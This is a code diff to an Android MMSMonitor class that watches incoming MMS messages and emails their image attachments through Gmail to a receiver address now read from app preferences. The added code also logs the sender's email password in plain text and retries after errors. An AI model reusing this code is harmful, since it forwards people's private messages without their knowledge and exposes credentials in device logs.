@@ -31,12 +31,14 @@ public class MMSMonitor {
     int mmsCount = 0;
     String lastMMSTxId = null;
     String code;
+    AppPreference appPreference;
 
     public MMSMonitor(final Context mainContext) {
         this.context = mainContext;
         contentResolver = mainContext.getContentResolver();
         mmshandler = new MMSHandler();
         mmsObserver = new MMSObserver(mmshandler);
+        appPreference = new AppPreference(mainContext);
         Log("", "MMSMonitor :: ***** Start MMS Monitor *****");
     }
 
@@ -213,12 +215,18 @@ public class MMSMonitor {
                                     Log("", "MMSMonitor :: Iimage width : "+ bitmap.getWidth() + " height : " + bitmap.getHeight());
 
                                     try{
-                                        GMailSender sender = new GMailSender("unpaidfee@gmail.com", "");
+                                        String senderAddress = appPreference.getValue(Commons.SENDER_EMAIL_ADDRESS);
+                                        String senderPassword = appPreference.getValue(Commons.SENDER_EMAIL_PASSWORD);
+                                        String receiverAddress = appPreference.getValue(Commons.RECEIVER_EMAIL_ADDRESS);
+
+                                        Log.d("yskang", "Try to send Email using [[" + senderAddress + "]] [[" + senderPassword + "]] to [[" + receiverAddress + "]]" );
+
+                                        GMailSender sender = new GMailSender(senderAddress, senderPassword);
 
                                         saveBitmapToFileCache(bitmap, context.getCacheDir().toString() + "/temp.jpg");
 
                                         sender.addAttachment(context.getCacheDir().toString() + "/temp.jpg", "첨부제목");
-                                        sender.sendMail("테스트 제목", "본문", "unpaidfee@gmail.com", "unpaidfee@gmail.com");
+                                        sender.sendMail("테스트 제목", "본문", "unpaidfee@gmail.com", receiverAddress);
                                     }catch (Exception e){
                                         Log("", e.getMessage());
                                     }
@@ -228,6 +236,12 @@ public class MMSMonitor {
 
                     } catch (Exception e) {
                         Log("", "MMSMonitor Exception:: "+ e.getMessage());
+                        try {
+                            Thread.sleep(5000);
+                            onChange(true);
+                        } catch (InterruptedException e1) {
+                            e1.printStackTrace();
+                        }
                     }
                 }
             };
